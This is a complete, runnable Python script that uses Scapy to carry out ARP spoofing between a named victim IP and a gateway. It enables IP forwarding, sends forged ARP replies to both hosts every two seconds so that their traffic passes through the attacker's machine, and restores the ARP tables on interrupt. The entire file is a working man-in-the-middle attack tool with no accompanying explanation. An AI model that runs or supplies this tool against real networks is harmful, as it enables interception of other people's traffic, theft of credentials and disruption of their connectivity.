#!/usr/bin/env python3

import time
import sys
import os
import signal
import argparse
from scapy.all import ARP, Ether, send, srp, conf

def get_mac(ip):
    """Returns the MAC address of a given IP"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    """Sends a spoofed ARP reply"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    """Restores the normal ARP table"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("victim_ip", help="IP address of the victim")
    parser.add_argument("gateway_ip", help="IP address of the gateway")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--no-forward", action="store_true", help="Disable IP forwarding")
    args = parser.parse_args()

    conf.iface = args.interface

    victim_mac = get_mac(args.victim_ip)
    gateway_mac = get_mac(args.gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[!] Could not find MAC addresses. Exiting.")
        sys.exit(1)

    if not args.no_forward:
        enable_ip_forwarding()

    def stop_attack(sig, frame):
        print("\n[!] Restoring ARP tables...")
        restore(args.victim_ip, args.gateway_ip, victim_mac, gateway_mac)
        restore(args.gateway_ip, args.victim_ip, gateway_mac, victim_mac)
        if not args.no_forward:
            disable_ip_forwarding()
        print("[+] ARP tables restored. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop_attack)

    print(f"[+] Starting ARP spoofing between {args.victim_ip} and {args.gateway_ip}...")
    while True:
        spoof(args.victim_ip, args.gateway_ip, victim_mac)
        spoof(args.gateway_ip, args.victim_ip, gateway_mac)
        if args.verbose:
            print(f"[+] Sent spoofed ARP replies to {args.victim_ip} and {args.gateway_ip}")
        time.sleep(2)

if __name__ == "__main__":
    main()